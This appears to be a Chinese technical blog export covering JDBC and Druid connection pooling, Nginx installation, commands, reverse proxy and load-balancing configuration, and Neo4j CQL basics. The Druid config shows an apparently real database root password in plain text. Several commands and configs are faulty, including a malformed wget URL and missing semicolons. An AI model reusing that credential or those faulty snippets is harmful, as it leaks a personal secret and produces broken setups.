class="line">connection.close();</span><br></pre></td></tr></table></figure>
<p>事务完成后，数据库内容已经发生变化<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163244.png"></p>
<blockquote>
<ul>
<li><strong>ResultSet executeQuery(sql) 使用</strong></li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 3.定义 sql</span></span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from students&quot;</span>;</span><br><span class="line"><span class="comment">// 4.获取执行sql的对象 Statement</span></span><br><span class="line"><span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> connection.createStatement();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	<span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> stmt.executeQuery(sql);</span><br><span class="line">	<span class="keyword">while</span>(resultSet.next()) &#123;</span><br><span class="line">		<span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> resultSet.getInt(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">		<span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> resultSet.getString(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">		<span class="type">String</span> <span class="variable">gender</span> <span class="operator">=</span> resultSet.getString(<span class="string">&quot;gender&quot;</span>);</span><br><span class="line">		<span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> resultSet.getInt(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">		System.out.format(<span class="string">&quot;id: %-2d name: %-6s gender: %-2s age: %-2d\n&quot;</span>, id , name, gender, age);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	效果同上</span></span><br><span class="line"><span class="comment">		while(resultSet.next()) &#123;</span></span><br><span class="line"><span class="comment">			int id = resultSet.getInt(1);</span></span><br><span class="line"><span class="comment">			String name = resultSet.getString(2);</span></span><br><span class="line"><span class="comment">			String gender = resultSet.getString(3);</span></span><br><span class="line"><span class="comment">			int age = resultSet.getInt(4);</span></span><br><span class="line"><span class="comment">			System.out.format(&quot;id: %-2d name: %-6s gender: %-2s age: %-2d\n&quot;, id , name, gender, age);</span></span><br><span class="line"><span class="comment">		&#125;</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	resultSet.close();</span><br><span class="line">	stmt.close();</span><br><span class="line">	connection.close();</span><br><span class="line">	&#125; <span class="keyword">catch</span> (SQLException var12) &#123;</span><br><span class="line">			connection.rollback();</span><br><span class="line">			var12.printStackTrace();</span><br><span class="line">	  &#125; <span class="keyword">catch</span> (Exception var13) &#123;</span><br><span class="line">			var13.printStackTrace();</span><br><span class="line">	  &#125;</span><br></pre></td></tr></table></figure>
<p>事务完成后查询结果如下<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163244.png"></p>
<h2 id="④关闭资源"><a href="#④关闭资源" class="headerlink" title="④关闭资源"></a>④关闭资源</h2><p>操作完成后要将所有使用的JDBC对象关闭，以释放JDBC资源。</p>
<blockquote>
<p><strong>关闭顺序与声明顺序相反</strong>：</p>
<ol>
<li>先关闭RequestSet对象</li>
<li>再关闭Statement对象</li>
<li>最后关闭Connection对象</li>
</ol>
</blockquote>
<h1 id="四、数据库连接池简介"><a href="#四、数据库连接池简介" class="headerlink" title="四、数据库连接池简介"></a>四、数据库连接池简介</h1><ul>
<li><p>数据库连接池是个&#x3D;&#x3D;容器&#x3D;&#x3D;，负责分配、管理数据库连接（Connection）</p>
</li>
<li><p>它允许应用程序重复使用一个现有的数据库连接，而不是重新建立一个</p>
</li>
<li><p>释放空闲空间超过最大空闲时间的数据库连接来避免因为没有释放数据库连接而引起的数据库&#x3D;&#x3D;连接遗漏&#x3D;&#x3D;</p>
<blockquote>
<p> <strong>好处</strong> </p>
<ul>
<li>资源重用 </li>
<li>提升系统响应速度 </li>
<li>避免数据库连接遗漏</li>
</ul>
</blockquote>
</li>
</ul>
<hr>
<blockquote>
<p><strong>数据库连接池实现</strong><br><strong>标准接口</strong>：<code>DataSource</code></p>
<ul>
<li>官方（sun公司）提供的数据库连接池标准接口，由第三方组织实现此接口</li>
<li>功能：获取连接</li>
</ul>
</blockquote>
<hr>
<blockquote>
<p>Druid（德鲁伊）</p>
<ul>
<li>Druid连接池是阿里巴巴开源的数据库连接池项目</li>
<li>功能强大，性能优秀，是Java语言最好的数据库连接池之一</li>
</ul>
</blockquote>
<h1 id="五、Druid使用步骤"><a href="#五、Druid使用步骤" class="headerlink" title="五、Druid使用步骤"></a>五、Druid使用步骤</h1><h2 id="①定义配置文件"><a href="#①定义配置文件" class="headerlink" title="①定义配置文件"></a>①定义配置文件</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">driverClassName=com.mysql.jdbc.Driver</span><br><span class="line">url=jdbc:mysql:<span class="comment">//localhost:3306/test?useSSL=false</span></span><br><span class="line">username=root</span><br><span class="line">password=tangyitao273169.</span><br><span class="line"># 初始化连接池数量</span><br><span class="line">initialSize=<span class="number">5</span></span><br><span class="line"># 最大连接池</span><br><span class="line">maxActive=<span class="number">10</span></span><br><span class="line"># 最长等待时间 (ms)</span><br><span class="line">maxWait=<span class="number">3000</span></span><br></pre></td></tr></table></figure>
<p>定义配置，并将文件命名为 xxx.properties。</p>
<h2 id="②加载配置文件"><a href="#②加载配置文件" class="headerlink" title="②加载配置文件"></a>②加载配置文件</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Properties</span> <span class="variable">prop</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">prop.load(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(①配置文件所在路径));</span><br></pre></td></tr></table></figure>
<h2 id="③获取连接池对象"><a href="#③获取连接池对象" class="headerlink" title="③获取连接池对象"></a>③获取连接池对象</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">DataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> DruidDataSourceFactory.createDataSource(prop);</span><br></pre></td></tr></table></figure>
<h2 id="④获取数据库连接"><a href="#④获取数据库连接" class="headerlink" title="④获取数据库连接"></a>④获取数据库连接</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> dataSource.getConnection();</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Properties</span> <span class="variable">prop</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">prop.load(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(①配置文件所在路径));</span><br><span class="line"><span class="type">DataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> DruidDataSourceFactory.createDataSource(prop);</span><br><span class="line"><span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> dataSource.getConnection();</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>jdbc</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx基本使用</title>
    <url>/posts/71d3dda2.html</url>
    <content><![CDATA[<h1 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h1><h2 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1. 介绍"></a>1. 介绍</h2><ul>
<li>Nginx是一款轻量级的 Web 服务器&#x2F;反向代理服务器及电子邮件（IMAP&#x2F;POP3）代理服务器。通常用于反向代理、负载均衡和HTTP缓存，是一个反向代理服务器软件。其特点是占有内存少，并发能力强，中国大陆使用 Nginx 的网站有：百度、京东、新浪、网易、腾讯、淘宝等。</li>
<li>Nginx 可以作为静态页面的 web 服务器，同时还支持 CGI 协议的动态语言，比如 perl、php 等。但是不支持 java。Java 程序只能通过与 tomcat 配合完成。Nginx 专为性能优化而开发， 性能是其最重要的考量,实现上非常注重效率 ，能经受高负载的考验,有报告表明能支持高 达 50,000 个并发连接数。</li>
</ul>
<p>官网：<a href="https://nginx.org/">https://nginx.org/</a></p>
<blockquote>
<ul>
<li>正向代理隐藏<code>真实客户端</code>，反向代理隐藏<code>真实服务端</code></li>
</ul>
</blockquote>
<hr>
<h2 id="2-下载与安装"><a href="#2-下载与安装" class="headerlink" title="2. 下载与安装"></a>2. 下载与安装</h2><p><strong>① 因为 Nginx 是基于C语言开发的，所以需要先安装依赖以支持C语言的编译</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install gcc pcre-devel zlib-devel openssl-devel</span><br></pre></td></tr></table></figure>


<p><strong>② 使用 wget 下载 Nginx 依赖包</strong></p>
<ul>
<li>先到 <a href="https://nginx.org/en/download.html">Nginx 官方网站</a> 确定要下的 Nginx 的安装包的名字<br>我这里选取了<code>nginx-1.16.1</code><br>之后就使用命令</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://nginx.org/en/download.html/nginx-1.16.1.tar.gz</span><br></pre></td></tr></table></figure>

<p>如果你选取了 <code>nginx-1.18.0</code><br>你就需要使用命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://nginx.org/en/download.html/nginx-1.18.0.tar.gz</span><br></pre></td></tr></table></figure>

<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143716.png" alt="  "></p>
<p>使用 wget的前提是要安装 wget</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install wget</span><br></pre></td></tr></table></figure>


<hr>
<p><strong>③ 解压</strong><br>此处我将其解压在了 <code>/usr/local</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -zxvf nginx-1.16.1.tar.gz -C /usr/local</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>④ 现在才开始安装Nginx</strong> </p>
<p>进入刚才解压的包中，有一个文件 <code>configure</code>，我们需要使用它安装 Nginx 并指定安装路径</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143720.png" alt="  "></p>
<p>我准备将 Nginx 安装在 <code>/ur/local/nginx</code>，因此我需要新建一个文件夹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /usr/local/nginx</span><br></pre></td></tr></table></figure>

<p>之后再指定 Nginx 的安装路径</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./configure --prefix=/usr/local/nginx</span><br></pre></td></tr></table></figure>

<p>最后开始真正的安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>


<hr>
<p><strong>基于此，Nginx 的安装也完成了</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install gcc pcre-devel zlib-devel openssl-devel</span><br><span class="line">yum install wget</span><br><span class="line">wget https://nginx.org/en/download.html/nginx-1.18.0.tar.gz</span><br><span class="line">tar -zxvf nginx-1.16.1.tar.gz -C /usr/local</span><br><span class="line"><span class="built_in">mkdir</span> /usr/local/nginx</span><br><span class="line">./configure --prefix=/usr/local/nginx</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="3-Nginx目录结构"><a href="#3-Nginx目录结构" class="headerlink" title="3. Nginx目录结构"></a>3. Nginx目录结构</h2><p>我们进入到 Nginx 的安装目录 <code>/usr/local/nginx</code>，发现有4个文件夹</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143724.png" alt="  "></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143725.png" alt="  "></p>
<p><strong>其中重点目录&#x2F;文件：</strong></p>
<ul>
<li><code>conf/nginx.conf</code>：存放 Nginx 配置文件</li>
<li><code>html</code>：存放静态文件（html、css、js等）</li>
<li><code>logs</code>：日志记录，存放日志文件</li>
<li><code>sbin/nginx</code>：二进制文件，用于启动、停止 Nginx 服务</li>
</ul>
<hr>
<h1 id="二、Nginx常用命令"><a href="#二、Nginx常用命令" class="headerlink" title="二、Nginx常用命令"></a>二、Nginx常用命令</h1><h2 id="1-查看版本"><a href="#1-查看版本" class="headerlink" title="1. 查看版本"></a>1. 查看版本</h2><p>进入到 <code>sbin</code> 文件夹，使用命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./nginx -v</span><br></pre></td></tr></table></figure>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143729.png" alt="  "></p>
<hr>
<h2 id="2-检查配置文件正确性"><a href="#2-检查配置文件正确性" class="headerlink" title="2. 检查配置文件正确性"></a>2. 检查配置文件正确性</h2><p>在启动 Nginx 服务之前，可以先检查一下 <code>conf/nginx.conf</code> 文件配置是否有错误，进入到 <code>sbin</code> 文件夹，使用命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./nginx -t</span><br></pre></td></tr></table></figure>


<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143731.png" alt="  "></p>
<hr>
<h2 id="3-启动和停止"><a href="#3-启动和停止" class="headerlink" title="3. 启动和停止"></a>3. 启动和停止</h2><p><strong>以下命令均在 <code>sbin</code> 目录下执行</strong></p>
<ul>
<li>启动Nginx服务使用如下命令</li>
</ul>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./nginx </span><br></pre></td></tr></table></figure>

<p><strong>启动之后可以查看 Nginx 的启动页面，Nginx使用的默认为 80 端口</strong></p>
<p>首先使用 <code>ip addr</code> 查看 linux 的 ip 地址</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143734.png" alt="  "></p>
<p>然后开启 80 端口或暂时关闭防火墙</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">开启 80 端口</span><br><span class="line">firewall-cmd --zone=public --add-port=80/tcp --permanent</span><br><span class="line"></span><br><span class="line">暂时关闭防火墙</span><br><span class="line">systemctl stop firewalld</span><br><span class="line"></span><br><span class="line">立即生效</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>

<p>之后直接访问ip地址加80端口（80可省略）</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143738.png" alt="  "></p>
<ul>
<li>停止Nginx服务使用如下命令</li>
</ul>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./nginx -s stop</span><br></pre></td></tr></table></figure>


<ul>
<li>启动完成后可以查看Nginx进程 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -ef | grep nginx</span><br></pre></td></tr></table></figure></li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143740.png" alt="  "></p>
<hr>
<h2 id="4-重新加载配置文件"><a href="#4-重新加载配置文件" class="headerlink" title="4. 重新加载配置文件"></a>4. 重新加载配置文件</h2><p>当修改 Nginx 配置文件后，需要重新加载才能生效，可以使用下面命令重新加载配置文件（在 <code>sbin</code> 目录下）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./nginx -s reload</span><br></pre></td></tr></table></figure>



<h1 id="三、Nginx配置文件结构"><a href="#三、Nginx配置文件结构" class="headerlink" title="三、Nginx配置文件结构"></a>三、Nginx配置文件结构</h1><p><strong>Nginx配置文件（conf&#x2F;nginx.conf）整体分为三部分：&#x3D;&#x3D;（全局块、events块、http块）&#x3D;&#x3D;</strong></p>
<blockquote>
<ul>
<li><strong>全局块</strong>：<br>和 Nginx 运行相关的全局配置。一般有运行nginx服务器的用户组，nginx进程，pid存放路径，日志存放路径，配置文件引入，允许生成worker process数等</li>
</ul>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143745.png" alt="  "></p>
<p><strong>全局块配置示例</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#user  nobody;                   #配置用户或者组，默认为nobody</span></span><br><span class="line">worker_processes  1;             <span class="comment">#允许生成的进程数，默认为1</span></span><br><span class="line"><span class="comment">#error_log  logs/error.log;      #制定日志路径，级别。这个设置可以放入全局块，</span></span><br><span class="line">			<span class="comment">#http块，server块，级别以此为:debug|info|notice|warn|error|crit|alert|emerg</span></span><br><span class="line"><span class="comment">#error_log  logs/error.log  notice;</span></span><br><span class="line"><span class="comment">#error_log  logs/error.log  info;</span></span><br><span class="line"><span class="comment">#pid        logs/nginx.pid;      #指定nginx进程运行文件存放地址</span></span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li><strong>events块</strong>：<br>配置影响nginx服务器或与用户的网络连接。有每个进程的最大连接数，选取哪种事件驱动模型处理连接请求，是否允许同时接受多个网路连接，开启多个网络连接序列化等。</li>
</ul>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143747.png" alt="  "></p>
<p><strong>events块配置示例</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">events&#123;</span><br><span class="line">	accept_mutex on;             <span class="comment">#设置网路连接序列化，防止惊群现象发生，默认为on</span></span><br><span class="line">	multi_accept on;             <span class="comment">#设置一个进程是否同时接受多个网络连接，默认为off</span></span><br><span class="line">	<span class="comment">#use epoll;                  #事件驱动模型，select|poll|kqueue|epoll|resig|/dev/poll|eventport</span></span><br><span class="line">	worker_connections  1024;    <span class="comment">#最大连接数，默认为1024(早期是512)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li><strong>http块</strong>：<br>可以嵌套多个server，配置代理，缓存，日志定义等绝大多数功能和第三方模块的配置。如文件引入，mime-type定义，日志自定义，是否使用sendfile传输文件，连接超时时间，单连接请求数等。</li>
</ul>
<hr>
<p>其中 http块分为http全局块与Server块，Server块又分为Server全局块与location块</p>
<ol>
<li>http 全局块</li>
<li>Server 块 		<br> ① Server 全局块 		<br>② location 块</li>
</ol>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143750.png" alt="  "></p>
<p><strong>Server块配置示例</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#配置虚拟主机</span></span><br><span class="line">server &#123;</span><br><span class="line">	listen       80;         <span class="comment">#配置监听端口</span></span><br><span class="line">	server_name  localhost;  <span class="comment">#配置服务器名</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">#charset koi8-r;  #编码格式</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">#access_log  logs/host.access.log  main; //主机的访问日志（如没有，全局为准）</span></span><br><span class="line">	<span class="comment">#默认的匹配/请求，当访问路径中有/，会被该location匹配处理</span></span><br><span class="line">	location / &#123;</span><br><span class="line">		root   html;      <span class="comment">#root是配置服务器的默认网站根目录位置，在nginx目录下html</span></span><br><span class="line">		index  index.html index.htm;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">#error_page  404              /404.html; #配置404页面</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment"># redirect server error pages to the static page /50x.html</span></span><br><span class="line">	<span class="comment">#</span></span><br><span class="line">	error_page   500 502 503 504  /50x.html; <span class="comment">#配置50x页面</span></span><br><span class="line">	</span><br><span class="line">	location = /50x.html &#123;  <span class="comment">#精确匹配 </span></span><br><span class="line">		root   html;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="comment">#禁止(外网）访问 .htaccess文件</span></span><br><span class="line">	<span class="comment"># deny access to .htaccess files, if Apache&#x27;s document root</span></span><br><span class="line">	<span class="comment"># concurs with nginx&#x27;s one</span></span><br><span class="line">	<span class="comment">#</span></span><br><span class="line">	<span class="comment">#location ~ /\.ht &#123;</span></span><br><span class="line">	<span class="comment">#    deny  all;</span></span><br><span class="line">	<span class="comment">#&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>&#x3D;&#x3D;<strong>注意</strong>：http 块中可以配置多个 Server 块，每个 Server 块中可以配置多个 location 块。&#x3D;&#x3D;</p>
<h1 id="四、Nginx具体应用"><a href="#四、Nginx具体应用" class="headerlink" title="四、Nginx具体应用"></a>四、Nginx具体应用</h1><h2 id="1-部署静态资源"><a href="#1-部署静态资源" class="headerlink" title="1. 部署静态资源"></a>1. 部署静态资源</h2><ul>
<li>Nginx 可以作为静态 Web 服务器来部署静态资源。静态资源指在服务器真实存在并且能够直接展示的一些文件，比如常见的html页面、css文件、js文件、图片、视频等资源。</li>
<li>相对于 Tomcat，Nginx处理静态资源的能力更加高效，所以在生产环境下，一般都会将静态资源部署到 Nginx 中。将静态资源部署到 Nginx 非常简单，只需要&#x3D;&#x3D;将文件复制到 Nginx 安装目录下的html目录中&#x3D;&#x3D;即可。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">	<span class="comment"># 监听端口</span></span><br><span class="line">	listen 80;</span><br><span class="line">	<span class="comment"># 服务器名称</span></span><br><span class="line">	server_name  localhost;</span><br><span class="line">	<span class="comment"># 匹配客户端请求 url</span></span><br><span class="line">	location / &#123;</span><br><span class="line">		<span class="comment"># 指定静态资源根目录</span></span><br><span class="line">		root   html;</span><br><span class="line">		<span class="comment"># 指定默认首页</span></span><br><span class="line">		index  index.html index.htm;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-反向代理"><a href="#2-反向代理" class="headerlink" title="2. 反向代理"></a>2. 反向代理</h2><blockquote>
<p><strong>正向代理</strong></p>
<ul>
<li>是一个位于客户端和原始服务器（originserver）之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标（原始服务器），然后代理向原始服务器转交请求并将获得的内容返回给客户端。</li>
<li>正向代理的典型用途是为在防火墙内的局域网客户端提供访问Internet的途径。</li>
<li>正向代理一般是<strong>在客户端设置代理服务器</strong>，通过代理服务器转发请求，最终访问到目标服务器。<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143754.png" alt="  "></li>
</ul>
</blockquote>
<hr>
<blockquote>
<p><strong>反向代理</strong></p>
<ul>
<li>反向代理服务器位于用户与目标服务器之间，但是对于用户而言，反向代理期就相当于目标服务器，即用户直接访问反向代理服务器就可以获得目标服务器的资源，反向代理服务器负责将请求转发给目标服务器。</li>
<li>客户端不需要知道目标服务器的地址，也无需在客户端作任何设定。<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143756.png" alt="  "></li>
</ul>
</blockquote>
<hr>
<ul>
<li><strong>配置反向代理</strong>（在 192.168.138.100 处服务器进行配置）</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">	<span class="comment"># 监听端口</span></span><br><span class="line">	listen 82;</span><br><span class="line">	<span class="comment"># 服务器名称</span></span><br><span class="line">	server_name  localhost;</span><br><span class="line">	<span class="comment"># 匹配客户端请求 url</span></span><br><span class="line">	location / &#123;</span><br><span class="line">		<span class="comment"># 反向代理配置，将请求转发到指定服务</span></span><br><span class="line">		proxy_pass	http://192.168.138.101:指定端口</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143759.png" alt="  "></p>
<hr>
<h2 id="3-负载均衡"><a href="#3-负载均衡" class="headerlink" title="3. 负载均衡"></a>3. 负载均衡</h2><p>早期的网站流量和业务功能都比较简单，单台服务器就可以满足基本需求，但随着互联网发展，业务流量越来越大并且业务逻辑也越来越复杂，单台服务器的性能及单点故障问题就凸显出来了，因此需要多台服务器组成应用集群，进行性能的水平扩展以及避免单点故障出现。</p>
<blockquote>
<ul>
<li><strong>应用集群</strong>：将同一应用部署到多台机器上，组成应用集群，接受负载均衡器分发的请求，进行业务处理并返回响应数据</li>
<li><strong>负载均衡器</strong>：将用户请求根据对应的负载均衡算法分发到应用集群中的一台服务器进行处理</li>
</ul>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143801.png" alt="  "></p>
<ul>
<li><strong>配置负载均衡</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># upstream 指令可以定义一组服务器</span></span><br><span class="line">upstream nginxCluster&#123;</span><br><span class="line">	server 192.168.138.101:8080</span><br><span class="line">	server 192.168.138.102:8080</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">	listen 8080;</span><br><span class="line">	server_name  localhost;</span><br><span class="line">	location / &#123;</span><br><span class="line">		proxy_pass	http://nginxCluster</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>负载均衡策略</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143803.png" alt="  "></p>
<ul>
<li><strong>轮询</strong>：默认的方式是轮询</li>
</ul>
<p>每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器down掉，能自动剔除。</p>
<hr>
<ul>
<li><strong>weight</strong>：在指定服务器后加上权重 <code>weight</code></li>
</ul>
<p>weight和访问比率成正比，用于后端服务器性能不均的情况默认选项，当weight不指定时，各服务器weight相同。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># upstream 指令可以定义一组服务器</span></span><br><span class="line">upstream targetserver&#123;</span><br><span class="line">	server 192.168.138.101:8080 weight=20;</span><br><span class="line">	server 192.168.138.102:8080 weight=10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<ul>
<li><strong>ip_hash</strong> ：依据ip分配方式</li>
</ul>
<p>每个请求按访问ip的hash值分配，这样同一客户端连续的Web请求都会被分发到同一服务器进行处理，可以解决session的问题。当后台服务器宕机时，会自动跳转到其它服务器。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># upstream 指令可以定义一组服务器</span></span><br><span class="line">upstream targetserver&#123;</span><br><span class="line">	ip_hash;</span><br><span class="line">	server 192.168.138.101:8080;</span><br><span class="line">	server 192.168.138.102:8080;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>基于weight的负载均衡和基于ip_hash的负载均衡可以组合在一起使用</strong></p>
</blockquote>
<hr>
<ul>
<li><strong>least_conn</strong>：依据最少连接</li>
</ul>
<p>最少连接，把请求转发给连接数较少的后端服务器。轮询算法是把请求平均的转发给各个后端，使它们的负载大致相同；但是，有些请求占用的时间很长，会导致其所在的后端负载较高。这种情况下，least_conn这种方式就可以达到更好的负载均衡效果。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># upstream 指令可以定义一组服务器</span></span><br><span class="line">upstream targetserver&#123;</span><br><span class="line">	least_conn;</span><br><span class="line">	server 192.168.138.101:8080;</span><br><span class="line">	server 192.168.138.102:8080;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<ul>
<li><strong>url_hash</strong>：依据url分配方式</li>
</ul>
<p>nginx按访问url的hash结果来分配请求，使每个url定向到同一个后端服务器，后端服务器为缓存服务器、文件服务器、静态服务器时比较有效。缺点是当后端服务器宕机的时候，url_hash不会自动跳转的其他缓存服务器，而是返回给用户一个503错误。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># upstream 指令可以定义一组服务器</span></span><br><span class="line">upstream targetserver&#123;</span><br><span class="line">	<span class="built_in">hash</span> <span class="variable">$request_uri</span>;;</span><br><span class="line">	server 192.168.138.101:8080;</span><br><span class="line">	server 192.168.138.102:8080;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>url_hash是nginx的第三方模块，nginx本身不支持，需要打补丁</strong></p>
</blockquote>
<hr>
<ul>
<li><strong>fair</strong>（第三方）</li>
</ul>
<p>按后端服务器的响应时间来分配请求，响应时间短的优先分配</p>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>nginx</tag>
        <tag>服务器</tag>
      </tags>
  </entry>
  <entry>
    <title>neo4j图形数据库操作语言CQL常用语法</title>
    <url>/posts/7f6e5a2.html</url>
    <content><![CDATA[<h1 id="一、MATCH命令"><a href="#一、MATCH命令" class="headerlink" title="一、MATCH命令"></a>一、MATCH命令</h1><blockquote>
<p><strong>Neo4j CQL MATCH 命令用于</strong></p>
<ul>
<li>从数据库获取有关节点和属性的数据</li>
<li>从数据库获取有关节点，关系和属性的数据</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">MATCH</span> (</span><br><span class="line">   节点名:标签名</span><br><span class="line">   &#123; 	</span><br><span class="line">      属性名<span class="number">1</span>:属性值<span class="number">1</span>,</span><br><span class="line">      ........</span><br><span class="line">      属性名n:属性值n</span><br><span class="line">   &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
